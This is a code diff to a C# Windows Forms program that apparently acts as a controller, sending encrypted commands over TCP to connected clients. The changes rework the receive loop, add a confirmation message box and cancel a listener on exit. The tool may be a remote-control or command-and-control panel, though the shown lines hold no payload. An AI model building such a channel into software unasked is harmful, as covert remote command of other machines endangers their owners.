@@ -111,18 +111,17 @@ namespace PR0T0TYP3
 		public static String DownloadData(TcpClient curClient)
 		{
 			String dataS = "";
-			while (true)
+			NetworkStream stream = curClient.GetStream();
+			byte[] data = new byte[4096];
+			using (MemoryStream ms = new MemoryStream())
 			{
-				byte[] data = new byte[curClient.ReceiveBufferSize];
-				NetworkStream stream = curClient.GetStream();
-				int byteCount = stream.Read(data, 0, data.Length);
-
-				if (byteCount == 0)
+				int bytesRead;
+				do
 				{
-					break;
-				}
-
-				dataS = decrypt(Convert.ToBase64String(data));
+					bytesRead = stream.Read(data, 0, data.Length);
+					ms.Write(data, 0, bytesRead);
+				} while (stream.DataAvailable);
+				dataS = decrypt(Convert.ToBase64String(ms.ToArray()));
 			}
 			if (!String.IsNullOrEmpty(dataS))
 				return dataS;
@@ -305,6 +304,7 @@ namespace PR0T0TYP3
 				byte[] command = encrypt(cmdInput.Text);
 				NetworkStream curStream = clientSelected.GetStream();
 				curStream.Write(command, 0, command.Length);
+				MessageBox.Show("Command Sent!", "Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
 			}
 			catch (Exception exc)
 			{
@@ -349,6 +349,7 @@ namespace PR0T0TYP3
 		{
 			try
 			{
+				listenerWorker.CancelAsync();
 				Environment.Exit(0);
 			}
 			catch (Exception)
